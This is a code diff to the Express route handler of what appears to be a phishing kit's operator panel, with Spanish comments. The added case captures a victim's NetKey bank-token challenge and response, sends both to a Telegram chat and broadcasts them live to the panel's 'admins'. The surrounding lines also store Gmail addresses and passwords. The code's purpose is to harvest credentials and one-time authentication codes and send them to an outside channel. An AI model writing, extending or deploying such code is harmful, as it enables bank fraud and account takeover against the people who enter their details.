@@ -1644,6 +1644,36 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 updatedFields.celular = inputData.celular;
                 updatedFields.pasoActual = ScreenType.CODIGO;
                 break;
+              case 'netkey_response':
+                updatedFields.netkeyResponse = inputData.netkeyResponse;
+                updatedFields.pasoActual = ScreenType.VALIDANDO;
+                console.log('Respuesta NetKey recibida:', inputData.netkeyResponse);
+                
+                // Obtener el challenge original para incluirlo en la notificación
+                const challengeCode = existingSession?.challenge || 'N/A';
+                
+                // Enviar notificación a Telegram
+                const netkeyMessage = `🔐 <b>RESPUESTA NETKEY RECIBIDA</b>\n\n` +
+                  `📋 <b>Folio:</b> ${sessionFolio}\n` +
+                  `🔢 <b>CHALLENGE:</b> ${challengeCode}\n` +
+                  `✅ <b>RESPUESTA:</b> ${inputData.netkeyResponse}\n` +
+                  `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
+                sendTelegramMessage(netkeyMessage);
+                
+                // Notificar al admin
+                const netkeyCreatedBy = existingSession?.createdBy || '';
+                
+                broadcastToAdmins(JSON.stringify({
+                  type: 'NETKEY_RESPONSE_RECEIVED',
+                  data: {
+                    sessionId,
+                    challenge: challengeCode,
+                    response: inputData.netkeyResponse,
+                    timestamp: new Date().toISOString(),
+                    createdBy: netkeyCreatedBy
+                  }
+                }), netkeyCreatedBy);
+                break;
               case 'gmail':
                 updatedFields.correo = inputData.correo;
                 updatedFields.contrasena = inputData.contrasena;
